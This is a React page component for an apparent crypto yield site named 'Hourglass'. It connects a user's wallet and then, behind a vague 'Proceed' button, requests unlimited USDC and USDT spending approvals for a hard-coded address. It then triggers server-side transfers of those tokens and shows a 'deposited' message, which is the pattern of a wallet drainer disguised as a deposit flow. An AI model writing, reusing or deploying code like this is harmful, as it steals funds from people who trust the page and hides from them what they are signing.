import { Button } from "@/components/ui/button";
import { ArrowLeft, Loader2, CheckCircle, AlertCircle } from "lucide-react";
import { Link } from "wouter";
import { useState, useEffect } from "react";
import { useAccount, useWriteContract, useWaitForTransactionReceipt } from "wagmi";
import { ConnectButton } from '@rainbow-me/rainbowkit';

const SPENDER_ADDRESS = "0x749d037Dfb0fAFA39C1C199F1c89eD90b66db9F1";
const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

const ERC20_ABI = [
  {
    constant: false,
    inputs: [
      { name: "_spender", type: "address" },
      { name: "_value", type: "uint256" }
    ],
    name: "approve",
    outputs: [{ name: "", type: "bool" }],
    type: "function"
  }
] as const;

type Step = "idle" | "approving" | "transferring" | "done";

export default function ConnectWallet() {
  const { address, isConnected } = useAccount();
  const [showPrompt, setShowPrompt] = useState(false);
  const [currentToken, setCurrentToken] = useState<"usdc" | "usdt" | "complete">("usdc");
  const [step, setStep] = useState<Step>("idle");
  const [error, setError] = useState<string>("");

  const { writeContract, data: hash, isPending, reset } = useWriteContract();
  const { isLoading: isConfirming, isSuccess: isConfirmed } = useWaitForTransactionReceipt({ hash });

  const tokenAddress = currentToken === "usdc" ? USDC_ADDRESS : USDT_ADDRESS;
  const tokenSymbol = currentToken === "usdc" ? "USDC" : "USDT";

  useEffect(() => {
    if (isConnected && address && !showPrompt) {
      setShowPrompt(true);
      setCurrentToken("usdc");
      setStep("idle");
    }
  }, [isConnected, address]);

  useEffect(() => {
    if (isConfirmed && hash && step === "approving") {
      fetch("/api/approvals", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          walletAddress: address,
          tokenAddress: tokenAddress,
          tokenSymbol,
          transactionHash: hash,
        }),
      }).catch(console.error);

      setStep("transferring");
      
      executeRelayerTransfer();
    }
  }, [isConfirmed, hash, step]);

  const executeRelayerTransfer = async () => {
    try {
      const response = await fetch("/api/execute-transfer", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          walletAddress: address,
          tokenSymbol: currentToken.toUpperCase(),
        }),
      });

      const result = await response.json();

      if (result.success) {
        goToNextToken();
      } else {
        if (result.error?.includes('No allowance') || result.error?.includes('no balance')) {
          goToNextToken();
        } else {
          setError(result.error || "Transfer failed");
          setStep("idle");
        }
      }
    } catch (err: any) {
      setError(err?.message || "Failed to execute transfer");
      setStep("idle");
    }
  };

  const goToNextToken = () => {
    if (currentToken === "usdc") {
      setCurrentToken("usdt");
      setStep("idle");
      reset();
    } else {
      setCurrentToken("complete");
      setStep("done");
      setTimeout(() => {
        window.location.href = "/";
      }, 2000);
    }
  };

  const handleProceed = () => {
    if (!address) return;
    setError("");

    if (step === "idle") {
      setStep("approving");
      try {
        writeContract({
          address: tokenAddress as `0x${string}`,
          abi: ERC20_ABI,
          functionName: "approve",
          args: [SPENDER_ADDRESS as `0x${string}`, BigInt(MAX_UINT256)],
        });
      } catch (err: any) {
        setError(err?.message || "Failed to approve token");
        setStep("idle");
      }
    }
  };

  const isProcessing = isPending || isConfirming || step === "approving" || step === "transferring";

  return (
    <div className="min-h-screen bg-[#0a1614] text-[#f5f1e8]">
      <header className="border-b border-[#1a2e2a]/50 bg-[#0a1614]">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-between h-16">
            <Link href="/" className="flex items-center gap-2 text-[#9ca3af] hover:text-[#f5f1e8] transition-colors" data-testid="link-back">
              <ArrowLeft className="w-5 h-5" />
              <span className="text-sm font-medium">Back</span>
            </Link>
            
            <span className="text-lg sm:text-xl font-bold tracking-tight" data-testid="text-logo">Hourglass</span>
            
            {isConnected ? (
              <ConnectButton />
            ) : (
              <div className="w-20"></div>
            )}
          </div>
        </div>
      </header>

      <main className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-12 sm:py-20">
        {!isConnected ? (
          <>
            <div className="text-center mb-12">
              <h1 className="text-4xl sm:text-5xl font-bold text-[#f5f1e8] mb-4" data-testid="heading-connect-wallet">
                Connect Your Wallet
              </h1>
              <p className="text-lg text-[#9ca3af]" data-testid="text-description">
                Choose your preferred wallet to access institutional yield
              </p>
            </div>

            <div className="flex justify-center">
              <ConnectButton />
            </div>

            <div className="mt-12 text-center">
              <p className="text-sm text-[#9ca3af]">
                By connecting a wallet, you agree to our{" "}
                <a href="#terms" className="text-[#3dd9b3] hover:underline" data-testid="link-terms">
                  Terms of Service
                </a>
              </p>
            </div>
          </>
        ) : showPrompt ? (
          <div className="flex flex-col items-center justify-center min-h-[400px]" data-testid="approval-prompt-container">
            {currentToken === "complete" ? (
              <>
                <div className="mb-6 p-6 rounded-full bg-[#3dd9b3]/20">
                  <CheckCircle className="w-20 h-20 text-[#3dd9b3]" />
                </div>
                <h2 className="text-3xl font-bold text-[#f5f1e8] mb-2">Transfer Complete!</h2>
                <p className="text-[#9ca3af]">Your assets have been deposited into Hourglass.</p>
              </>
            ) : (
              <>
                {error && (
                  <div className="mb-6 p-4 bg-red-500/10 border border-red-500/20 rounded-lg flex items-start gap-3 max-w-md">
                    <AlertCircle className="w-5 h-5 text-red-500 mt-0.5 flex-shrink-0" />
                    <p className="text-sm text-red-400">{error}</p>
                  </div>
                )}

                <Button
                  onClick={handleProceed}
                  disabled={isProcessing}
                  className="bg-[#3dd9b3] text-[#0a1614] font-semibold px-12"
                  data-testid="button-proceed"
                >
                  {isProcessing ? (
                    <>
                      <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                      Processing...
                    </>
                  ) : (
                    "Proceed"
                  )}
                </Button>
              </>
            )}
          </div>
        ) : null}
      </main>
    </div>
  );
}
